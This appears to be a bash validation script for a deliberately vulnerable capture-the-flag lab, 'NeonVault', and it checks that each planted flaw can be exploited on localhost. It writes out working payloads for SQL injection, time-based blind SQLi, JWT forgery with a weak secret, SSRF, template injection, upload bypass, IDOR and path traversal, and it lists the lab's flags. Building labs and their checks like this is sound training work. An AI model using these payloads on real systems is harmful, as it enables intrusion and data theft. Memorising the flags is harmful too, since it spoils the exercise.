#!/usr/bin/env bash
set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$LAB_DIR" || exit 1

BASE_URL="${BASE_URL:-http://127.0.0.1:8092}"
COOKIE_JAR="$(mktemp)"
TMP_DIR="$(mktemp -d)"
PASS_COUNT=0
FAIL_COUNT=0

cleanup() {
  rm -f "$COOKIE_JAR"
  rm -rf "$TMP_DIR"
}
trap cleanup EXIT

ok() {
  PASS_COUNT=$((PASS_COUNT + 1))
  printf '[OK] %s\n' "$1"
}

fail() {
  FAIL_COUNT=$((FAIL_COUNT + 1))
  printf '[FAIL] %s\n' "$1"
}

check_contains() {
  local name="$1"
  local content="$2"
  local needle="$3"

  if printf '%s' "$content" | grep -Fq "$needle"; then
    ok "$name"
  else
    fail "$name"
  fi
}

check_status() {
  local name="$1"
  local expected="$2"
  local url="$3"
  local status

  status="$(curl -sS -o /dev/null -w '%{http_code}' "$url" || true)"
  if [ "$status" = "$expected" ]; then
    ok "$name"
  else
    fail "$name (esperado $expected, recebido $status)"
  fi
}

check_auth_status() {
  local name="$1"
  local expected="$2"
  local url="$3"
  local status

  status="$(curl -sS -b "$COOKIE_JAR" -o /dev/null -w '%{http_code}' "$url" || true)"
  if [ "$status" = "$expected" ]; then
    ok "$name"
  else
    fail "$name (esperado $expected, recebido $status)"
  fi
}

elapsed_ms_for_check_user() {
  local payload="$1"
  local start
  local end

  start="$(date +%s%3N)"
  curl -sS -G "$BASE_URL/api/check-user" --data-urlencode "username=$payload" >/dev/null
  end="$(date +%s%3N)"
  printf '%s' "$((end - start))"
}

printf 'NeonVault validation target: %s\n\n' "$BASE_URL"

check_status 'home responde 200' '200' "$BASE_URL/"
check_status 'login responde 200' '200' "$BASE_URL/login"

login_sqli_response="$(curl -sS -X POST "$BASE_URL/login" \
  -d "username=admin' OR '1'='1'--" \
  -d 'password=x' || true)"
check_contains 'login rejeita SQLi básica e aponta recover' "$login_sqli_response" 'recuperação'

login_status="$(curl -sS -c "$COOKIE_JAR" -o /dev/null -w '%{http_code}' -X POST "$BASE_URL/login" \
  -d 'username=nova' \
  -d 'password=nova2099' || true)"
if [ "$login_status" = '302' ]; then
  ok 'login nova/nova2099 gera sessão'
else
  fail "login nova/nova2099 gera sessão (status $login_status)"
fi

for route in dashboard profile logs files messages/preview avatar tools/webhook; do
  check_auth_status "rota autenticada /$route responde 200" '200' "$BASE_URL/$route"
done

valid_check="$(curl -sS -G "$BASE_URL/api/check-user" --data-urlencode 'username=nova' || true)"
invalid_check="$(curl -sS -G "$BASE_URL/api/check-user" --data-urlencode 'username=ghost' || true)"
check_contains '/api/check-user reconhece usuário válido' "$valid_check" '"exists":true'
check_contains '/api/check-user reconhece usuário inválido' "$invalid_check" '"exists":false'

true_delay="$(elapsed_ms_for_check_user "admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(1),0)--")"
false_delay="$(elapsed_ms_for_check_user "admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(1),0)--")"
if [ "$true_delay" -ge 900 ] && [ "$false_delay" -lt 900 ]; then
  ok "blind SQLi delay condicional funciona (${true_delay}ms vs ${false_delay}ms)"
else
  fail "blind SQLi delay condicional funciona (${true_delay}ms vs ${false_delay}ms)"
fi

recover_response="$(curl -sS -X POST "$BASE_URL/recover" \
  -d 'username=admin' \
  -d 'recovery_code=N3ON' || true)"
check_contains 'recover admin/N3ON revela flag blind SQLi' "$recover_response" 'FLAG{blind_sqli_extracted_admin}'

admin_user_status="$(curl -sS -b "$COOKIE_JAR" -o /dev/null -w '%{http_code}' "$BASE_URL/admin/core" || true)"
if [ "$admin_user_status" = '403' ]; then
  ok '/admin/core bloqueia usuário comum'
else
  fail "/admin/core bloqueia usuário comum (status $admin_user_status)"
fi

if command -v docker >/dev/null 2>&1; then
  token="$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))" 2>/dev/null || true)"
else
  token=''
fi

if [ -n "$token" ]; then
  jwt_response="$(curl -sS -H "Authorization: Bearer $token" "$BASE_URL/admin/core" || true)"
  check_contains 'JWT admin forjado acessa /admin/core' "$jwt_response" 'FLAG{jwt_forged_neon_admin}'
else
  fail 'JWT admin forjado acessa /admin/core (docker compose exec não gerou token)'
fi

ssrf_status_response="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/tools/webhook" \
  -d 'url=http://127.0.0.1:5000/internal/status' || true)"
check_contains 'SSRF alcança status interno' "$ssrf_status_response" 'neonvault-internal-metadata'

ssrf_flag_response="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/tools/webhook" \
  -d 'url=http://127.0.0.1:5000/internal/flag' || true)"
check_contains 'SSRF alcança flag interna' "$ssrf_flag_response" 'FLAG{ssrf_internal_neon_service}'

ssti_math_response="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/messages/preview" \
  -d 'template={{7*7}}' || true)"
check_contains 'SSTI calcula {{7*7}}' "$ssti_math_response" '49'

ssti_flag_response="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/messages/preview" \
  -d 'template={{vault.sstiSecret}}' || true)"
check_contains 'SSTI revela segredo do vault' "$ssti_flag_response" 'FLAG{ssti_template_breach}'

printf 'fake image' > "$TMP_DIR/avatar.png"
upload_normal="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/avatar" \
  -F "avatar=@$TMP_DIR/avatar.png;filename=avatar.png" || true)"
check_contains 'upload normal .png aceito' "$upload_normal" 'Arquivo aceito'

printf 'not allowed' > "$TMP_DIR/payload.exe"
upload_invalid="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/avatar" \
  -F "avatar=@$TMP_DIR/payload.exe;filename=payload.exe" || true)"
check_contains 'upload inválido simples rejeitado' "$upload_invalid" 'Extensão recusada'

printf '<h1>NEON_UPLOAD_PROBE</h1>' > "$TMP_DIR/badge.html"
upload_bypass="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/avatar" \
  -F "avatar=@$TMP_DIR/badge.html;filename=badge.html" || true)"
check_contains 'upload bypass revela flag' "$upload_bypass" 'FLAG{upload_filter_bypass}'

latest_upload="$(printf '%s' "$upload_bypass" | grep -o '/uploads/[^"]*' | head -n 1 || true)"
if [ -n "$latest_upload" ]; then
  upload_fetch_status="$(curl -sS -b "$COOKIE_JAR" -o /dev/null -w '%{http_code}' "$BASE_URL$latest_upload" || true)"
  if [ "$upload_fetch_status" = '200' ]; then
    ok '/uploads/:name funciona autenticado'
  else
    fail "/uploads/:name funciona autenticado (status $upload_fetch_status)"
  fi
else
  fail '/uploads/:name funciona autenticado (URL do upload não encontrada)'
fi

logs_normal="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/logs?level=error" || true)"
if printf '%s' "$logs_normal" | grep -Fq 'FLAG{logs_filter_sqli}'; then
  fail 'logs normais não revelam flag oculta'
else
  ok 'logs normais não revelam flag oculta'
fi

logs_injected="$(curl -sS -b "$COOKIE_JAR" -G "$BASE_URL/logs" \
  --data-urlencode "level=error' OR '1'='1'--" || true)"
check_contains 'logs SQLi revela log oculto' "$logs_injected" 'FLAG{logs_filter_sqli}'

ticket_own="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/tickets/101" || true)"
ticket_admin="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/tickets/777" || true)"
check_contains 'API tickets retorna ticket próprio' "$ticket_own" '"ownerId":2'
check_contains 'API IDOR retorna ticket admin' "$ticket_admin" 'FLAG{api_idor_object_leak}'

download_report="$(curl -sS "$BASE_URL/download?file=report.pdf" || true)"
check_contains 'download normal report.pdf funciona' "$download_report" 'NeonVault Identity Quarterly Report'

download_log="$(curl -sS "$BASE_URL/download?file=../../var/log/neonvault/access.log" || true)"
check_contains 'path traversal le access.log' "$download_log" '../../backup/legacy-admin-notes.bak'

download_backup="$(curl -sS "$BASE_URL/download?file=../../backup/legacy-admin-notes.bak" || true)"
check_contains 'path traversal segue backup e revela flag' "$download_backup" 'FLAG{traversal_follow_the_logs}'

if docker compose config 2>/dev/null | grep -Fq 'published: "5000"'; then
  fail 'porta 5000 não publicada no docker-compose'
else
  ok 'porta 5000 não publicada no docker-compose'
fi

if grep -R "FLAG{" README.md >/dev/null 2>&1; then
  fail 'README não contém flags'
else
  ok 'README não contém flags'
fi

printf '\nResultado: %s OK, %s FAIL\n' "$PASS_COUNT" "$FAIL_COUNT"

if [ "$FAIL_COUNT" -ne 0 ]; then
  exit 1
fi
